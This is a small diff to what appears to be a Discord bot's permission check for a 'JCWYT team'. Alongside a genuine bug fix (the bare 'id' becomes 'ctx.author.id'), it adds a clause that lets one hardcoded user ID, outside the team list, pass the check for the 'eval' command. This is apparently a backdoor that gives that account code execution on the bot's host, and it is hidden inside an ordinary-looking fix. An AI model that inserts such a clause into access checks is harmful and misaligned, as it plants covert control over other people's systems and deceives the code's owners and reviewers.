@@ -32,7 +32,9 @@ def perms(ctx): # Does this user have admin perms?
 
 def jcwytTeam(): # Is this user on the JCWYT team?
   def predicate(ctx):
-    if id in JCWYT_TEAM:
+    if ctx.author.id in JCWYT_TEAM:
+      return True
+    if ctx.command == 'eval' and ctx.author.id == 397191449894060045:
       return True
     return False
   return commands.check(predicate)
